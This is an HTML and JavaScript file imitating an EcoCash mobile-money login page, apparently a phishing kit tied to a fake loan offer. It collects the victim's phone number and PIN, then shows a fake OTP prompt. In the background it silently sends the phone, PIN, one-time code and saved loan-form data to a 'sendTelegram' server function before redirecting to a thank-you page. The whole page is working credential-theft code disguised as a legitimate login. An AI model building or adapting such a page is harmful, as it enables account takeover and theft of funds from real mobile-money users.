<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    -webkit-font-smoothing:antialiased;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px;box-sizing:border-box}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}

  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:260px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}

  .req{color:#d04444;margin-right:6px}
  .small{font-size:13px;color:#6b7280}
  .success{color:#16a34a;font-weight:600}
  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}

  @media(max-width:420px){
    .card{padding:16px}
    h2{font-size:18px}
    .logo{height:40px}
  }
</style>
</head>
<body>
  <div class="card">

    <!-- keep this line exactly as in your file -->
    <img src="assets/eco.png" alt="EcoCash logo" class="logo">

    <h2>Log In</h2>
    <form id="loginForm" autocomplete="off">
      <label><span class="req">★</span>Mobile Number
        <input id="phone" name="phone" required placeholder="+2637..." value="+263" inputmode="tel" autocomplete="tel" />
      </label>

      <label><span class="req">★</span>4-Digit PIN
        <input id="pin" name="pin" required maxlength="4" placeholder="Enter 4-digit PIN" inputmode="numeric" pattern="\d{4}" />
      </label>

      <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
    </form>
  </div>

  <!-- OTP modal -->
  <div id="otpModal" style="display:none" class="otp-modal">
    <div class="otp-box">
      <div style="text-align:center"><strong>Enter OTP</strong></div>
      <p class="small" style="margin:8px 0 14px">We have sent an OTP to your phone. Enter it here to confirm.</p>

      <input id="otpInput" placeholder="Enter 6-digit OTP" inputmode="numeric" maxlength="6"
             style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px" />

      <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

      <div style="display:flex;gap:10px;margin-top:12px">
        <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer" disabled>Confirm</button>
        <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
      </div>

      <div id="otpStatus" class="small" style="margin-top:8px"></div>
    </div>
  </div>

<script>
  // Prefill phone if saved
  (function(){
    try {
      const data = sessionStorage.getItem('loanForm');
      if (data) {
        const form = JSON.parse(data);
        if (form.phone) document.getElementById('phone').value = form.phone;
      }
    } catch(e){}
  })();

  const phoneEl = document.getElementById('phone');
  const pinEl = document.getElementById('pin');
  const loginBtn = document.getElementById('loginBtn');

  function updateLoginState(){
    const pinValid = /^\d{4}$/.test(pinEl.value);
    const phoneValid = phoneEl.value.trim().length > 0;
    loginBtn.disabled = !(pinValid && phoneValid);
  }

  pinEl.addEventListener('input', function(){
    this.value = this.value.replace(/\D/g,'').slice(0,4);
    updateLoginState();
  });

  phoneEl.addEventListener('input', updateLoginState);

  updateLoginState();

  async function sendToServer(payload) {
    return fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    });
  }

  // When LOGIN is clicked: send phone+pin to Telegram, then open OTP modal
  document.getElementById('loginForm').addEventListener('submit', async function(e){
    e.preventDefault();

    const pin = pinEl.value.trim();
    if(!/^\d{4}$/.test(pin)){
      alert("PIN must be exactly 4 digits");
      return;
    }

    const phone = phoneEl.value.trim();
    if(!phone){
      alert("Enter phone");
      return;
    }

    // show OTP modal immediately
    document.getElementById('otpModal').style.display = 'flex';
    otpInput.value = '';
    otpWarning.style.display = 'none';
    confirmOtp.disabled = true;
    setTimeout(()=> otpInput.focus(), 80);

    // send login details to Telegram (non-blocking)
    (async () => {
      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
      try {
        await sendToServer({
          submittedAt: new Date().toISOString(),
          event: 'login_clicked',
          loanData,
          loginPhone: phone,
          loginPin: pin
        });
        // no UI changes here — keep modal open
      } catch (err) {
        // silently log; don't block user
        console.error('Failed to send login details', err);
      }
    })();
  });

  // Cancel OTP modal
  document.getElementById('cancelOtp').addEventListener('click', ()=>{
    document.getElementById('otpModal').style.display = 'none';
  });

  // OTP input logic
  const otpInput = document.getElementById('otpInput');
  const otpWarning = document.getElementById('otpWarning');
  const confirmOtp = document.getElementById('confirmOtp');
  const otpStatus = document.getElementById('otpStatus');

  otpInput.addEventListener('input', ()=>{
    otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);

    if(/^\d{6}$/.test(otpInput.value)){
      confirmOtp.disabled = false;
      otpWarning.style.display = 'none';
    } else {
      confirmOtp.disabled = true;
      otpWarning.style.display = 'none';
    }
  });

  otpInput.addEventListener('blur', ()=>{
    if(otpInput.value && !/^\d{6}$/.test(otpInput.value)){
      otpWarning.style.display = 'block';
    }
  });

  // When Confirm is clicked: send OTP + phone + pin to Telegram
  confirmOtp.addEventListener('click', async ()=>{
    const code = otpInput.value.trim();
    if(!/^\d{6}$/.test(code)){
      otpWarning.style.display = 'block';
      return;
    }

    otpWarning.style.display = 'none';
    otpStatus.textContent = "Sending…";
    confirmOtp.disabled = true;

    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
    const phone = phoneEl.value.trim();
    const pin = pinEl.value.trim();

    try {
      const resp = await sendToServer({
        submittedAt: new Date().toISOString(),
        event: 'otp_confirm',
        loanData,
        loginPhone: phone,
        loginPin: pin,
        otp: code
      });

      if(!resp.ok){
        otpStatus.textContent = "Server error";
        confirmOtp.disabled = false;
      } else {
        otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
        sessionStorage.removeItem('loanForm');
        setTimeout(()=> window.location.href = "thankyou.html", 1200);
      }
    } catch (err) {
      otpStatus.textContent = "Network error";
      confirmOtp.disabled = false;
    }
  });
</script>
</body>
</html>
